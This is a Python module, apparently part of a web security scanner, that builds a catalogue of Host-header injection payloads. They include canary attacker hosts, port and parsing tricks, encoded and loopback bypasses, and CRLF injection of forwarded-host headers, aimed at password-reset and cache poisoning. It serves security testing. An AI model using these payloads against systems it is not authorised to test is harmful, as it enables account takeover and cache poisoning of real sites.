"""
Module: talos.host_header.payloads

Purpose:
    Host-header injection payload catalogue.

    Payloads **replace** the target header value. Connection stays on the
    captured origin; only Host / override headers change.

    Families:
        absolute      — attacker host (talos-hhi.invalid)
        port          — unexpected ports on canary or original host
        ambiguous     — Host parsing tricks (colon, comma, space, userinfo)
        absolute_url  — http(s):// and protocol-relative Host values
        encoded       — percent, double-percent, null, overlong, unicode, tab
        bypass        — trailing dot, whitespace, subdomain, loopback, IPv6
        crlf          — Host + injected X-Forwarded-Host / duplicate Host

    Placeholders rendered per flow:
        {CANARY}     — talos-hhi.invalid
        {ORIG}       — captured Host (host[:port])
        {ORIG_HOST}  — hostname only
        {ORIG_PORT}  — port or 443/80 default

Dependencies: talos.host_header.models
Data flow: CLI / engine → generate_host_header_payloads → job meta
Side effects: None.
"""

from __future__ import annotations

from typing import Optional
from urllib.parse import urlparse

from talos.host_header.models import (
    CANARY_HOST,
    FAMILIES,
    FAMILY_ABSOLUTE,
    FAMILY_ABSOLUTE_URL,
    FAMILY_AMBIGUOUS,
    FAMILY_BYPASS,
    FAMILY_CRLF,
    FAMILY_ENCODED,
    FAMILY_PORT,
    INJECT_REPLACE,
    HostHeaderPayload,
)

_HOST_ONLY = ("Host",)


def _payload(
    *,
    technique: str,
    family: str,
    payload: str,
    description: str,
    headers: tuple[str, ...] = (),
    inject_mode: str = INJECT_REPLACE,
) -> HostHeaderPayload:
    """Purpose: Build one catalogue row."""
    return HostHeaderPayload(
        technique=technique,
        family=family,
        payload=payload,
        description=description,
        headers=headers,
        inject_mode=inject_mode,
    )


def _base_payloads() -> list[HostHeaderPayload]:
    """Purpose: Full raw catalogue. Filtered later by --family / --technique."""
    return [
        # ---- Absolute attacker host -----------------------------------
        _payload(
            technique="abs_canary",
            family=FAMILY_ABSOLUTE,
            payload="{CANARY}",
            description="Replace with attacker canary host (password-reset / URL gen).",
        ),
        _payload(
            technique="abs_www",
            family=FAMILY_ABSOLUTE,
            payload="www.{CANARY}",
            description="www. prefix on the canary host.",
        ),
        _payload(
            technique="abs_attacker",
            family=FAMILY_ABSOLUTE,
            payload="attacker.{CANARY}",
            description="Subdomain of the canary (attacker.talos-hhi.invalid).",
        ),
        # ---- Port confusion -------------------------------------------
        _payload(
            technique="port_canary_80",
            family=FAMILY_PORT,
            payload="{CANARY}:80",
            description="Canary host with explicit :80.",
        ),
        _payload(
            technique="port_canary_443",
            family=FAMILY_PORT,
            payload="{CANARY}:443",
            description="Canary host with explicit :443.",
        ),
        _payload(
            technique="port_canary_8080",
            family=FAMILY_PORT,
            payload="{CANARY}:8080",
            description="Canary host with alternate :8080.",
        ),
        _payload(
            technique="port_orig_80",
            family=FAMILY_PORT,
            payload="{ORIG_HOST}:80",
            description="Original hostname forced to :80 (scheme/port mismatch).",
        ),
        _payload(
            technique="port_orig_443",
            family=FAMILY_PORT,
            payload="{ORIG_HOST}:443",
            description="Original hostname forced to :443.",
        ),
        _payload(
            technique="port_canary_orig",
            family=FAMILY_PORT,
            payload="{CANARY}:{ORIG_PORT}",
            description="Canary host keeping the captured port.",
        ),
        # ---- Ambiguous Host parsing -----------------------------------
        _payload(
            technique="amb_colon",
            family=FAMILY_AMBIGUOUS,
            payload="{ORIG_HOST}:{CANARY}",
            description="Host: victim:attacker (IIS/Apache absolute-URI / port parse).",
            headers=_HOST_ONLY,
        ),
        _payload(
            technique="amb_comma",
            family=FAMILY_AMBIGUOUS,
            payload="{ORIG_HOST},{CANARY}",
            description="Comma-separated Host list (first vs last consumer).",
        ),
        _payload(
            technique="amb_space",
            family=FAMILY_AMBIGUOUS,
            payload="{ORIG_HOST} {CANARY}",
            description="Space-separated Host tokens.",
        ),
        _payload(
            technique="amb_slash",
            family=FAMILY_AMBIGUOUS,
            payload="{ORIG_HOST}/{CANARY}",
            description="Host with leftover path (absolute-URI style).",
            headers=_HOST_ONLY,
        ),
        _payload(
            technique="amb_at_canary",
            family=FAMILY_AMBIGUOUS,
            payload="{CANARY}@{ORIG_HOST}",
            description="Userinfo-style canary@victim (some caches key on userinfo).",
        ),
        _payload(
            technique="amb_at_orig",
            family=FAMILY_AMBIGUOUS,
            payload="{ORIG_HOST}@{CANARY}",
            description="Userinfo-style victim@canary (authority after @).",
        ),
        _payload(
            technique="amb_hash",
            family=FAMILY_AMBIGUOUS,
            payload="{ORIG_HOST}#{CANARY}",
            description="Fragment after original host.",
            headers=_HOST_ONLY,
        ),
        # ---- Absolute URL as Host -------------------------------------
        _payload(
            technique="url_https",
            family=FAMILY_ABSOLUTE_URL,
            payload="https://{CANARY}",
            description="Absolute https://canary as the Host value.",
            headers=_HOST_ONLY,
        ),
        _payload(
            technique="url_http",
            family=FAMILY_ABSOLUTE_URL,
            payload="http://{CANARY}/",
            description="Absolute http://canary/ as the Host value.",
            headers=_HOST_ONLY,
        ),
        _payload(
            technique="url_proto_rel",
            family=FAMILY_ABSOLUTE_URL,
            payload="//{CANARY}",
            description="Protocol-relative //canary as the Host value.",
            headers=_HOST_ONLY,
        ),
        _payload(
            technique="url_https_reset",
            family=FAMILY_ABSOLUTE_URL,
            payload="https://{CANARY}/reset",
            description="Absolute reset-path URL stuffed into Host.",
            headers=_HOST_ONLY,
        ),
        # ---- Encoded --------------------------------------------------
        _payload(
            technique="enc_percent_dot",
            family=FAMILY_ENCODED,
            payload="talos-hhi%2einvalid",
            description="URL-encoded dot in the canary host.",
        ),
        _payload(
            technique="enc_double",
            family=FAMILY_ENCODED,
            payload="talos-hhi%252einvalid",
            description="Double URL-encoded dot (%252e).",
        ),
        _payload(
            technique="enc_null",
            family=FAMILY_ENCODED,
            payload="{CANARY}%00",
            description="Null-byte after the canary host.",
        ),
        _payload(
            technique="enc_null_orig",
            family=FAMILY_ENCODED,
            payload="{ORIG_HOST}%00.{CANARY}",
            description="Null truncate original host then canary suffix.",
        ),
        _payload(
            technique="enc_overlong_dot",
            family=FAMILY_ENCODED,
            payload="talos-hhi%c0%aeinvalid",
            description="Overlong UTF-8 dot (%c0%ae) in the canary host.",
        ),
        _payload(
            technique="enc_unicode_dot",
            family=FAMILY_ENCODED,
            payload="talos-hhi\u3002invalid",
            description="Ideographic full stop (U+3002) as the canary dot.",
        ),
        _payload(
            technique="enc_tab",
            family=FAMILY_ENCODED,
            payload="{CANARY}\t",
            description="Trailing tab after the canary host.",
        ),
        _payload(
            technique="enc_idn",
            family=FAMILY_ENCODED,
            payload="xn--talos-hhi-9za.invalid",
            description="Punycode / IDN lookalike of the canary host.",
        ),
        # ---- Bypass / internal / cache-key -----------------------------
        _payload(
            technique="bypass_trail_dot",
            family=FAMILY_BYPASS,
            payload="{CANARY}.",
            description="Trailing-dot FQDN on the canary (DNS absolute).",
        ),
        _payload(
            technique="bypass_orig_trail",
            family=FAMILY_BYPASS,
            payload="{ORIG_HOST}.",
            description="Trailing-dot on the original hostname.",
        ),
        _payload(
            technique="bypass_space_pre",
            family=FAMILY_BYPASS,
            payload=" {CANARY}",
            description="Leading space before the canary host.",
        ),
        _payload(
            technique="bypass_space_post",
            family=FAMILY_BYPASS,
            payload="{CANARY} ",
            description="Trailing space after the canary host.",
        ),
        _payload(
            technique="bypass_sub_poison",
            family=FAMILY_BYPASS,
            payload="{ORIG_HOST}.{CANARY}",
            description="victim.canary — classic password-reset / allowed-host suffix miss.",
        ),
        _payload(
            technique="bypass_sub_prefix",
            family=FAMILY_BYPASS,
            payload="{CANARY}.{ORIG_HOST}",
            description="canary.victim — subdomain of the original host.",
        ),
        _payload(
            technique="bypass_localhost",
            family=FAMILY_BYPASS,
            payload="localhost",
            description="Host: localhost (cache / internal URL generation).",
        ),
        _payload(
            technique="bypass_127",
            family=FAMILY_BYPASS,
            payload="127.0.0.1",
            description="Host: 127.0.0.1.",
        ),
        _payload(
            technique="bypass_ipv6",
            family=FAMILY_BYPASS,
            payload="[::1]",
            description="Host: [::1] IPv6 loopback.",
        ),
        _payload(
            technique="bypass_decimal",
            family=FAMILY_BYPASS,
            payload="2130706433",
            description="Decimal 127.0.0.1 (2130706433).",
        ),
        _payload(
            technique="bypass_zero",
            family=FAMILY_BYPASS,
            payload="0",
            description="Host: 0 (some stacks treat as 0.0.0.0 / localhost).",
        ),
        # ---- CRLF / header injection via Host -------------------------
        _payload(
            technique="crlf_xfh",
            family=FAMILY_CRLF,
            payload="{ORIG_HOST}\r\nX-Forwarded-Host: {CANARY}",
            description="CRLF after original Host injecting X-Forwarded-Host.",
            headers=_HOST_ONLY,
        ),
        _payload(
            technique="crlf_host",
            family=FAMILY_CRLF,
            payload="{ORIG_HOST}\r\nHost: {CANARY}",
            description="CRLF duplicate Host: canary (first vs last).",
            headers=_HOST_ONLY,
        ),
        _payload(
            technique="crlf_lf_xfh",
            family=FAMILY_CRLF,
            payload="{ORIG_HOST}\nX-Forwarded-Host: {CANARY}",
            description="LF-only inject of X-Forwarded-Host (some front-ends).",
            headers=_HOST_ONLY,
        ),
    ]


TECHNIQUE_CATALOG: tuple[dict[str, object], ...] = tuple(
    {
        "name": item.technique,
        "family": item.family,
        "description": item.description,
        "headers": list(item.headers),
        "inject_mode": item.inject_mode,
    }
    for item in _base_payloads()
)

TECHNIQUE_NAMES: tuple[str, ...] = tuple(str(item["name"]) for item in TECHNIQUE_CATALOG)
TECHNIQUE_BY_NAME: dict[str, dict[str, object]] = {
    str(item["name"]): item for item in TECHNIQUE_CATALOG
}

DEFAULT_PAYLOAD_COUNT = len(TECHNIQUE_CATALOG)


def split_orig_host(original: str, url: str = "") -> tuple[str, str, str]:
    """
    Purpose:
        Derive (full Host, hostname, port) from a captured Host or URL.
    Output:
        (orig, orig_host, orig_port)
    """
    raw = (original or "").strip()
    if not raw:
        parsed = urlparse(url or "")
        raw = parsed.netloc or parsed.hostname or ""
    host = raw
    port = ""
    hostname = raw
    if raw.startswith("["):
        end = raw.find("]")
        if end != -1:
            hostname = raw[: end + 1]
            rest = raw[end + 1 :]
            if rest.startswith(":"):
                port = rest[1:]
    elif raw.count(":") == 1:
        hostname, port = raw.split(":", 1)
    if not port:
        scheme = (urlparse(url or "").scheme or "").lower()
        port = "443" if scheme == "https" else "80"
    return host or raw, hostname or raw, port


def render_payload(
    item: HostHeaderPayload,
    original: str,
    *,
    url: str = "",
    header_name: str = "",
    canary_host: str = CANARY_HOST,
) -> str:
    """
    Purpose:
        Materialize the header value for one payload against one field.
    Output:
        Replacement string (Forwarded wrapped as host= when needed).
    """
    orig, orig_host, orig_port = split_orig_host(original, url)
    value = (
        item.payload.replace("{CANARY}", canary_host or CANARY_HOST)
        .replace("{ORIG_HOST}", orig_host or orig)
        .replace("{ORIG_PORT}", orig_port)
        .replace("{ORIG}", orig or orig_host)
    )
    if header_name.lower() == "forwarded":
        stripped = value.strip()
        lower = stripped.lower()
        if stripped and not lower.startswith(("for=", "host=", "by=", "proto=")):
            return f"host={stripped}"
    return value


def payload_applies(item: HostHeaderPayload, header_name: str) -> bool:
    """Purpose: True when this payload should run on ``header_name``."""
    if not item.headers:
        return True
    want = {name.lower() for name in item.headers}
    return header_name.lower() in want


def generate_host_header_payloads(
    *,
    techniques: Optional[list[str]] = None,
    families: Optional[list[str]] = None,
) -> list[HostHeaderPayload]:
    """
    Purpose:
        Return catalogue rows filtered by --technique / --family.
    Output:
        Non-empty list. Raises ValueError on unknown filters.
    """
    payloads = list(_base_payloads())
    if families:
        allow_fam = {name.strip() for name in families if name and name.strip()}
        unknown_fam = allow_fam - set(FAMILIES)
        if unknown_fam:
            raise ValueError(
                "unknown host-header family: "
                + ", ".join(sorted(unknown_fam))
                + f". Expected one of: {', '.join(FAMILIES)}"
            )
        payloads = [item for item in payloads if item.family in allow_fam]

    if techniques:
        allow = {name.strip() for name in techniques if name and name.strip()}
        known = {item.technique for item in _base_payloads()}
        unknown = allow - known
        if unknown:
            raise ValueError(
                "unknown host-header technique(s): " + ", ".join(sorted(unknown))
            )
        payloads = [item for item in payloads if item.technique in allow]
        missing = allow - {item.technique for item in payloads}
        if missing:
            raise ValueError(
                "host-header technique(s) not available for the selected "
                "family: " + ", ".join(sorted(missing))
            )
    return payloads
